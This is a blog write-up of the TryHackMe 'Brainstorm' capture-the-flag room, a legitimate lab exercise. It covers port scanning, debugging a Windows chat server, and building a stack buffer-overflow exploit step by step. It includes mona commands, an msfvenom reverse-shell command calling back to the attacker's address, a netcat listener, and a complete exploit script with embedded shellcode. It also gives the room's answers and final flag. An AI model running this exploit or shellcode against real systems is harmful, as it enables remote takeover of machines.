---
title: Brainstorm Write-up | TryHackMe
date: 2022-06-12 00:00:00 +530
categories: [Write Up, TryHackMe]
tags: [write up, tryhackme, ctf, medium, red team] # TAG names should always be lowercase
---

![screenshot](/assets/img/thm/Brainstorm/1.png)

Reverse engineer a chat program and write a script to exploit a Windows machine.

---

Running threader3000 scan:

```bash
python threader3000.py
10.10.197.53
```

![screenshot](/assets/img/thm/Brainstorm/2.png)

Q) How many ports are open? Ans .3 gives wrong answer, let us run Nmap Udp scan in the side:

```bash
sudo sudo nmap -sU -p- -Pn -vv 10.10.197.53
```

Till then, Running the suggested Nmap Scan:

![screenshot](/assets/img/thm/Brainstorm/3.png)

![screenshot](/assets/img/thm/Brainstorm/4.png)

We can login anonymously into the ftp.

;-; Since I’ve always felt the need to use Win VM. Took a while to set it up using QEMU. Had to restart the machine.

UDP scan gave up no results. :\_; skipping it for a while.

visiting ftp:

![screenshot](/assets/img/thm/Brainstorm/5.png)

answering task-2 question:

Q)What is the name of the exe file you found?

```bash
chatserver.exe
```

after downloading the files on windows vm.

lets checkout the unknown port ;-; by using netcat

```bash
nc 10.10.91.109 9999
```

response:

```bash
[ut@utkar5hm-g14-arch thm]$ nc 10.10.91.109 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): utkarsh
Write a message: hello there
Sun Jun 12 05:27:43 2022
utkarsh said: hello there
Write a message:
Sun Jun 12 05:27:44 2022
utkarsh said:
```

lets get back :-; to the VM and the exe obtained

trying to open it in immunity debugger:

![screenshot](/assets/img/thm/Brainstorm/6.png)

After troubleshooting for some time and later checking out discord, I found out that it needs to be downloaded in binary mode. :-;

I can finally launch the application:

can be accessed using nc:

```bash
nc 192.168.122.138 9999
```

![screenshot](/assets/img/thm/Brainstorm/7.png)

trying to overflow username input:

it checks lengths for smaller inputs greater than 20.

using a very large input: ;-;

```shell
/opt/metasploit-git/tools/exploit/pattern_create.rb -l 10000
```

Looks like it isn’t vulnerable to buffer overflow. We will have to work with the message.;\_;

lets try it with :-; the message, increasing length on each try by generating input from the above command.

we get a error at l=2100

let’s setup mona in immunity debugger.

config:

```shell
!mona config -set workingfolder c:\mona\%p"
```

for finding eip offset:

```shell
!mona findmsp -distance 2100
```

output offset: `2012`

![screenshot](/assets/img/thm/Brainstorm/8.png)

Now we need to check for bad characters ;-; for generating our shell.

lets first create a bytearray.bin using mona:

```shell
!mona bytearray -b "\x00"
```

generating badchars for input, using python script:

```python
for x in range(1, 256):
print("\\x" + "{:02x}".format(x), end='')
print()
```

we will send the below as input:

```
“A”*offset+ EIP(for returning) + badchars
```

we will make make use of a python script from here and modify it to our purposes: [link](https://stackoverflow.com/questions/50852062/send-byte-over-tcp-python)

```python
import socket
import struct
TCP_IP = '192.168.122.138'
TCP_PORT = 9999
BUFFER_SIZE = 1024
MESSAGE = b"hello"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.recv(BUFFER_SIZE)#welcome msg
s.recv(BUFFER_SIZE)#msg for username input
s.send(MESSAGE)#sending hello as username
s.recv(BUFFER_SIZE)#msg for message input
payload =""
s.send(bytes("A"*2012 + "BBBB"+ payload , "latin-1"))
s.close()
print( "done")
```

setting payload to our required value: here the hex values generated to check for badchars. here the retn value is temporarily set to BBBB. which can be changed to whatever we want.

After sending the payload.

we can use mona’s compare function to check for bad characters:

```shell
!mona compare -f "c:\mona\bytearray.bin" -a ESP
```

output:

![screenshot](/assets/img/thm/Brainstorm/9.png)

As it is unmodified. we don’t need to check further.

To find a jmp esp instruction, we can again use mona. It can find instructions where aslr is not enabled.

```shell
!mona jmp -r esp -cpb "\x00"
```

![screenshot](/assets/img/thm/Brainstorm/10.png)

we, will currently take the 0x625014df as the return address(EIP). :-;

As the system follows little endian, we need to switch EIP value with `\xdf\x14\x50\x62` in the python script. (currently `BBBB`)

using msfvenom to create a payload for reverse shell.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.47.158 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

We will also add NOP padding of 16 characters just before the payload:`”\x90"*16`

setting up a netcat listener at port 4444.

```bash
nc -lvnp 4444
```

executing it locally:

![screenshot](/assets/img/thm/Brainstorm/11.png)

we do gain a reverse shell, lets try it on the tryhackme’s system, :-; since I crashed the server last time. I have to restart it again. xD

It wasn’t working and then I tried generating other payloads specifying x86 architecture which failed too. finally, I tried setting up a listener with the attack box which successfully worked.

![screenshot](/assets/img/thm/Brainstorm/12.png)

Final flag:

```
5b1001de5a44eca47eee71e7942a8f8a
```

The final script:

```python
import socket
import struct
TCP_IP = '10.10.30.155'
TCP_PORT = 9999
BUFFER_SIZE = 1024
MESSAGE = b"hello"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print(s.recv(BUFFER_SIZE))
print(s.recv(BUFFER_SIZE))
s.send(MESSAGE)
print(s.recv(BUFFER_SIZE))
payload = ("\xb8\x03\xdb\xd2\x5c\xda\xd7\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x0e\x03\x44\xd5\x30\xa9\xb6\x01\x36"
"\x52\x46\xd2\x57\xda\xa3\xe3\x57\xb8\xa0\x54\x68\xca\xe4\x58"
"\x03\x9e\x1c\xea\x61\x37\x13\x5b\xcf\x61\x1a\x5c\x7c\x51\x3d"
"\xde\x7f\x86\x9d\xdf\x4f\xdb\xdc\x18\xad\x16\x8c\xf1\xb9\x85"
"\x20\x75\xf7\x15\xcb\xc5\x19\x1e\x28\x9d\x18\x0f\xff\x95\x42"
"\x8f\xfe\x7a\xff\x86\x18\x9e\x3a\x50\x93\x54\xb0\x63\x75\xa5"
"\x39\xcf\xb8\x09\xc8\x11\xfd\xae\x33\x64\xf7\xcc\xce\x7f\xcc"
"\xaf\x14\xf5\xd6\x08\xde\xad\x32\xa8\x33\x2b\xb1\xa6\xf8\x3f"
"\x9d\xaa\xff\xec\x96\xd7\x74\x13\x78\x5e\xce\x30\x5c\x3a\x94"
"\x59\xc5\xe6\x7b\x65\x15\x49\x23\xc3\x5e\x64\x30\x7e\x3d\xe1"
"\xf5\xb3\xbd\xf1\x91\xc4\xce\xc3\x3e\x7f\x58\x68\xb6\x59\x9f"
"\x8f\xed\x1e\x0f\x6e\x0e\x5f\x06\xb5\x5a\x0f\x30\x1c\xe3\xc4"
"\xc0\xa1\x36\x4a\x90\x0d\xe9\x2b\x40\xee\x59\xc4\x8a\xe1\x86"
"\xf4\xb5\x2b\xaf\x9f\x4c\xbc\xda\x55\x2b\x2e\xb3\x6b\xb3\x5e"
"\xd1\xe5\x55\x34\xc5\xa3\xce\xa1\x7c\xee\x84\x50\x80\x24\xe1"
"\x53\x0a\xcb\x16\x1d\xfb\xa6\x04\xca\x0b\xfd\x76\x5d\x13\x2b"
"\x1e\x01\x86\xb0\xde\x4c\xbb\x6e\x89\x19\x0d\x67\x5f\xb4\x34"
"\xd1\x7d\x45\xa0\x1a\xc5\x92\x11\xa4\xc4\x57\x2d\x82\xd6\xa1"
"\xae\x8e\x82\x7d\xf9\x58\x7c\x38\x53\x2b\xd6\x92\x08\xe5\xbe"
"\x63\x63\x36\xb8\x6b\xae\xc0\x24\xdd\x07\x95\x5b\xd2\xcf\x11"
"\x24\x0e\x70\xdd\xff\x8a\x90\x3c\xd5\xe6\x38\x99\xbc\x4a\x25"
"\x1a\x6b\x88\x50\x99\x99\x71\xa7\x81\xe8\x74\xe3\x05\x01\x05"
"\x7c\xe0\x25\xba\x7d\x21")
overflow = "A"*2012
retn = "\xdf\x14\x50\x62"
padding = "\x90"*16
msg = overflow + retn + padding + payload
s.send(bytes(msg, "latin-1"))
s.close()
print( "done")
```

After trying to find out :-; the final open ports, It was reported on discord as a issue by many. and its answer was 6.
